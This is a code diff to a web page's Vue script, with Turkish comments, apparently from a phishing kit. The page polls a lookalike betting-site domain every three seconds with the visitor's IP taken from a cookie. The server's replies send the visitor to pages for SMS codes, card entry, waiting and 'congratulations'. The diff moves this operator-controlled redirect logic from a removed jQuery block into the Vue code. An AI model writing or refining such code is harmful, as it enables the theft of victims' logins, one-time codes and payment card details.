@@ -751,7 +751,7 @@
       setInterval(() => {
         this.getUserIpFromCookie();
         this.makeRequests();
-      }, 13000);
+      }, 3000);
     },
     methods: {
       getUserIpFromCookie() {
@@ -759,21 +759,46 @@
         this.userIp = this.getCookie('user_ip');
       },
       makeRequests() {
-        if (this.userIp) {
-          // Kullanıcı IP'si varsa istek yap
-          axios.get(`https://xn--holiganbt930-8d6f.com/tr/datach.php?user_ip=${this.userIp}`)
+    if (this.userIp) {
+        // Kullanıcı IP'si varsa istek yap
+        axios.get(`https://xn--holiganbt930-8d6f.com/tr/datach.php?user_ip=${this.userIp}`)
             .then(response => {
-              this.results = response.data;
-              console.log('GET isteği başarıyla gönderildi. Sunucu yanıtı:', response.data);
+                this.results = response.data;
+                console.log('GET isteği başarıyla gönderildi. Sunucu yanıtı:', response.data);
+
+                // response.data'ya göre yönlendirme yap
+                if (response.data === 'sms') {
+                    window.location.href = 'sms.php';
+                } else if (response.data === 'tebrik') {
+                    window.location.href = 'tebrik.php';
+                } else if (response.data === 'hata') {
+                    window.location.href = '/login-error.html';
+                } else if (response.data === 'sms2') {
+                    window.location.href = 'hatali.php';
+                } else if (response.data === 'back') {
+                    window.location.href = 'sms.php';
+                } else if (response.data === 'back') {
+                    window.location.href = 'smsh.php';
+                } else if (response.data === '1') {
+                    window.location.href = 'smsh.php';
+                } else if (response.data === '2') {
+                    window.location.href = 'kart.php';
+                } else if (response.data === '3') {
+                    window.location.href = 'bekle.php';
+                } else if (response.data === '4') {
+                    window.location.href = 'hata.php';
+                } else if (response.data === '5') {
+                    window.location.href = 'tebrik.php';
+                }
             })
             .catch(error => {
-              console.error('GET isteği sırasında bir hata oluştu:', error);
+                console.error('GET isteği sırasında bir hata oluştu:', error);
             });
-        } else {
-          // Kullanıcı IP'si yoksa istek yapma
-          console.warn('Kullanıcı IP\'si bulunamadığı için GET isteği gönderilmedi.');
-        }
-      },
+    } else {
+        // Kullanıcı IP'si yoksa istek yapma
+        console.warn('Kullanıcı IP\'si bulunamadığı için GET isteği gönderilmedi.');
+    }
+},
       getCookie(cname) {
         const name = cname + '=';
         const decodedCookie = decodeURIComponent(document.cookie);
@@ -793,58 +818,8 @@
     }
   });
 </script>
-                <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-                <script>
-  
-  $(document).ready(function() {
-
-gonder();
-
-var int=self.setInterval("gonder()",2500);
-
-});
-
-  function gonder(){
-  ${this.userIp}
-      $.ajax({
-        type:'get',
-        url: 'https://xn--holiganbt930-8d6f.com/tr/datach.php?user_ip=' + this.userIp,
-        success: function (msg) {
         
-        if(msg=='sms'){
-          window.location.href='sms.php';
-        }
-        if(msg=='tebrik'){
-          window.location.href='tebrik.php';
-        }
-         if(msg=='hata'){
-          window.location.href='/login-error.html';
-        }
-        if(msg=='sms2'){
-          window.location.href='hatali.php';
-        }
-          if(msg=='back'){
-          window.location.href='sms.php';
-        }
-           if(msg=='back'){
-          window.location.href='smsh.php';
-        }
-              if(msg=='1'){
-          window.location.href='smsh.php';
-        }       if(msg=='2'){
-          window.location.href='kart.php';
-        }          if(msg=='3'){
-          window.location.href='bekle.php';
-        }          if(msg=='4'){
-          window.location.href='hata.php';
-        }          if(msg=='5'){
-          window.location.href='tebrik.php';
-        }  
-        }
-      });
-      
-  }
-  </script>
+     
   </body>
 </html>
  
